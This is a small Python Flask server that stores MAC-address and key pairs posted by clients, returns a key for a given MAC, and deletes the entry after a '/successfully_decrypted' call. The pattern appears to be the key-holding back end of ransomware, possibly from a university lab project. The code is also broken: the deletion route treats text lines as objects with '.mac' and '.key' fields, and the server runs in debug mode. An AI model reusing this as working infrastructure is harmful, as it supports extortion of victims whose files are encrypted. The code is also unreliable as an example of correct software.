from flask import Flask, request, send_file

app = Flask(__name__)

@app.route("/", methods=['GET', 'POST'])
def index():
    return "Server" #+send_file("base.jpg")

@app.route("/receive_data", methods=['POST'])
def receive_data():
    if request.method == "POST":
        mac = request.form['mac']
        key = request.form['key']
        with open('database.txt', 'a+', encoding="utf-8") as database:
            database.write(mac + ',' + key + '\n')
            print('key saved')
        return "MAC saved"

@app.route("/receive_key", methods=['POST'])
def receive_key():
    if request.method == "POST":
        mac = request.form['mac']
        with open('database.txt', 'r', encoding="utf-8") as database:
            entries = database.readlines()
        for entry in entries:
            if(mac in entry):
                return entry[len(mac)+1:len(entry)]

@app.route('/successfully_decrypted', methods=['POST'])
def successfully_decrypted():
    if request.method == "POST":
        mac = request.form['mac']
        with open('database.txt', 'r', encoding="utf-8") as database:
            entries = database.readlines()
        with open('database.txt', 'w', encoding="utf-8") as database:
            for entry in entries:
                if not(mac in entry):
                    database.write(entry.mac + ',' + entry.key + '\n')
        return "MAC Deleted"

@app.route('/image')
def get_image():
    return send_file("base.jpg")

if __name__ == "__main__":
    app.run(host="serverfag.gast.it.uc3m.es", port=8080, debug = True)

